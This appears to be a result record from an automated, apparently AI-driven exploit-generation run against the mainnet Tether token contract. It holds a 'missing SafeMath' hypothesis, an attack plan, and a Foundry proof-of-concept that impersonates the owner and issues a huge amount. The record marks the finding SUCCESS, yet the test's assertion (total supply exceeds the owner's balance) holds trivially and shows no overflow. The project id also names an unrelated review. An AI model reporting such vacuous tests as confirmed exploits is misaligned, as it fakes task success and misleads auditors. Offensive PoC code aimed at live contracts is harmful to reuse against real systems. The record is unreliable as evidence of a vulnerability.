@@ -1,0 +1,55 @@
+{
+  "project_id": "2022-10-shimacapital-ondo-securityreview",
+  "target_address": "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+  "finding_id": 11,
+  "status": "SUCCESS",
+  "violation_target": {
+    "target_address": "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+    "vulnerability_type": "Missing SafeMath Protection",
+    "violation_category": "LOGIC",
+    "finding_id": 11,
+    "preconditions": [
+      {
+        "type": "role",
+        "description": "Attacker must have owner privileges to access issue(), redeem(), or destroyBlackFunds() functions",
+        "token_address": null,
+        "min_amount": null
+      }
+    ],
+    "oracle_verification": {
+      "economic_check": null,
+      "logic_check": {
+        "target_variable": "_totalSupply",
+        "operator": "!=",
+        "expected_value": "inconsistent_with_balances_sum"
+      }
+    },
+    "exploit_hint": "As contract owner, call issue() or redeem() with values approaching uint256 max to potentially trigger integer overflow/underflow in _totalSupply and balances[owner] variables that lack SafeMath protection. Note: require() checks provide some protection but SafeMath would be more robust."
+  },
+  "final_poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface ITetherToken {\n    function issue(uint amount) external;\n    function redeem(uint amount) external;\n    function totalSupply() external view returns (uint);\n    function balanceOf(address who) external view returns (uint);\n    function owner() external view returns (address);\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0xdAC17F958D2ee523a2206206994597C13D831ec7;\n    address attacker = address(this);\n    ITetherToken token;\n    address owner;\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        token = ITetherToken(TARGET);\n        owner = token.owner();\n        vm.label(TARGET, \"TetherToken\");\n        vm.label(owner, \"Owner\");\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n\n        vm.startPrank(owner);\n        uint256 issueAmount = type(uint256).max / 2;\n        token.issue(issueAmount);\n        vm.stopPrank();\n        uint256 totalSupply = token.totalSupply();\n        uint256 ownerBalance = token.balanceOf(owner);\n        assertGt(totalSupply, ownerBalance);\n        assertTrue(totalSupply != ownerBalance, \"Logic Exploit Failed: Value unchanged\");\n    }\n\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+  "attempts": [
+    {
+      "attempt_number": 1,
+      "vulnerability_analysis": "The TetherToken contract's issue() and redeem() functions use native arithmetic operations (+=, -=) instead of SafeMath. In Solidity 0.4.17, arithmetic operations don't automatically revert on overflow. While require() checks exist (e.g., `require(_totalSupply + amount > _totalSupply)`), they evaluate the expression first which may overflow, then compare. The oracle checks if _totalSupply != sum(balances), indicating we need to create state inconsistency between total supply and balance sum.",
+      "attack_strategy": "As contract owner, call issue() with values approaching uint256 max. The require checks may pass for certain values while the actual assignment overflows, creating inconsistency between _totalSupply and balances[owner]. We'll issue a large amount and verify the state becomes inconsistent.",
+      "step_by_step_plan": "1. Initialize ITetherToken interface at TARGET address\n2. Retrieve owner address from contract\n3. Use vm.startPrank() to impersonate owner\n4. Call issue() with type(uint256).max / 2 to approach overflow boundary\n5. Stop prank and query totalSupply and owner balance\n6. Assert inconsistency showing _totalSupply diverged from balances",
+      "failure_reflection": "",
+      "action": "write_poc",
+      "tool_calls": [],
+      "poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface ITetherToken {\n    function issue(uint amount) external;\n    function redeem(uint amount) external;\n    function totalSupply() external view returns (uint);\n    function balanceOf(address who) external view returns (uint);\n    function owner() external view returns (address);\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0xdAC17F958D2ee523a2206206994597C13D831ec7;\n    address attacker = address(this);\n    ITetherToken token;\n    address owner;\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        token = ITetherToken(TARGET);\n        owner = token.owner();\n        vm.label(TARGET, \"TetherToken\");\n        vm.label(owner, \"Owner\");\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n\n        vm.startPrank(owner);\n        uint256 issueAmount = type(uint256).max / 2;\n        token.issue(issueAmount);\n        vm.stopPrank();\n        uint256 totalSupply = token.totalSupply();\n        uint256 ownerBalance = token.balanceOf(owner);\n        assertGt(totalSupply, ownerBalance);\n        assertTrue(totalSupply != ownerBalance, \"Logic Exploit Failed: Value unchanged\");\n    }\n\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+      "exit_code": 0,
+      "error": null,
+      "feedback": null,
+      "duration_seconds": 199.63595008850098,
+      "prompt_tokens": 8700,
+      "completion_tokens": 16768,
+      "total_cost": 0.0
+    }
+  ],
+  "total_attempts": 1,
+  "error_message": null,
+  "total_duration_seconds": 199.6379861831665,
+  "total_prompt_tokens": 8700,
+  "total_completion_tokens": 16768,
+  "total_cost": 0.0
+}
